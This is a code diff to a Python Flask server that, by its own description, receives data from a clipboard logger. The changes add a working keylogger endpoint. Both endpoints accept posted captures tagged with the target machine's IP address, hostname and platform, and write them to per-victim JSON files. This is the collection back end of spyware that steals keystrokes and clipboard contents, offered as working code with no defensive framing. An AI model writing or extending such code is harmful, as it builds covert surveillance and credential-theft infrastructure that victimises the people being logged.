@@ -5,8 +5,6 @@ Description: Receives data from the clipboard logger and
 Author: Benjamin Norman 2023
 '''
 
-
-
 from flask import app, request, Flask, Response
 import json
 from datetime import datetime
@@ -16,7 +14,7 @@ from env import *
 
 app = Flask(__name__)
 
-def file_upload(data, ipAddress, hostname, platform):
+def file_upload(data, ipAddress, hostname, platform, type):
     
     current_time_utc = datetime.utcnow()
     # Format the time in ISO 8601 format
@@ -27,9 +25,9 @@ def file_upload(data, ipAddress, hostname, platform):
     capturedData["timestamp"] = formattedDateTime
 
     # TODO Change the file name to that of the hostname of the target machine
-    if not os.path.exists(f"clipboard_{hostname}_{ipAddress}.json"):
-        with open(f"clipboard_{hostname}_{ipAddress}.json", 'w'): pass
-    with open(f"clipboard_{hostname}_{ipAddress}.json", 'r+') as f:
+    if not os.path.exists(f"{type}_{hostname}_{ipAddress}.json"):
+        with open(f"{type}_{hostname}_{ipAddress}.json", 'w'): pass
+    with open(f"{type}_{hostname}_{ipAddress}.json", 'r+') as f:
         try:
             file_data = json.load(f)
         except json.decoder.JSONDecodeError:
@@ -57,7 +55,7 @@ def clipboard_incoming():
         '''
         
         if jsonData["apiKey"] == APIKEY:
-            file_upload(jsonData["data"], jsonData["ipAddress"], jsonData["hostname"], jsonData["platform"])
+            file_upload(jsonData["data"], jsonData["ipAddress"], jsonData["hostname"], jsonData["platform"], "clipboard")
             return 'Successful'
         else:
             return Response('Invalid API key', status=400)
@@ -67,12 +65,17 @@ def clipboard_incoming():
 @app.route('/keylogger_incoming', methods=['POST'])
 def keylogger_incoming():
         
-        '''
-        Due to the amount of data that could be coming in, these will JSON dicts
-        that will need extracting into a seperate JSON file associated with the hostname
-        '''
-        pass
- 
+        if request.method == 'POST':
+            jsonData = request.get_json()
+            
+            if jsonData["apiKey"] == APIKEY:
+                file_upload(jsonData["data"], jsonData["ipAddress"], jsonData["hostname"], jsonData["platform"], "keylogger")
+                return 'Successful'
+            else:
+                return Response('Invalid API key', status=400)
+        else:
+            return Response('Invalid request method', status=400)
+    
 if __name__ == '__main__':
     
     app.run(port=SERVERPORT)
